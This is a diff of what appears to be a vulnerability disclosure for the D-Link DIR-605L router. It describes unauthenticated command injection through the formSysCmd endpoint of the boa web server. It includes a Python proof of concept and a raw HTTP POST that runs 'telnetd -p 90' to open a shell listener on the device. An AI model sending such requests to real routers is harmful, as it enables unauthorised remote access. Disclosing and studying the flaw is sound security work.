@@ -4,12 +4,15 @@ Vulnerability location: file:  /bin/boa  function:formSysCmd
 The attacker calls this function by sending a post packet to the http://ip/goform/formSysCmd page.
 The program will call the system function with the value of syscmd in the post package.
 Post package structure
+``` python
 postData = {
 	'sysCmd':cmd,
 	'submit-url':'1234',
 	}
 response = requests.post('http://192.168.0.1/goform/formSysCmd',data=postData)
+``` 
 Http message:
+``` 
 POST /goform/formSysCmd HTTP/1.1
 Host: 192.168.0.1
 Connection: keep-alive
@@ -19,7 +22,7 @@ User-Agent: python-requests/2.20.1
 Content-Length: 36
 Content-Type: application/x-www-form-urlencoded
 submit-url=1234&sysCmd=telnetd+-p+90
-
+``` 
 The same problem exists with the latest firmware 2.12B1 on the DIR-605L.
 download link:ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/
 
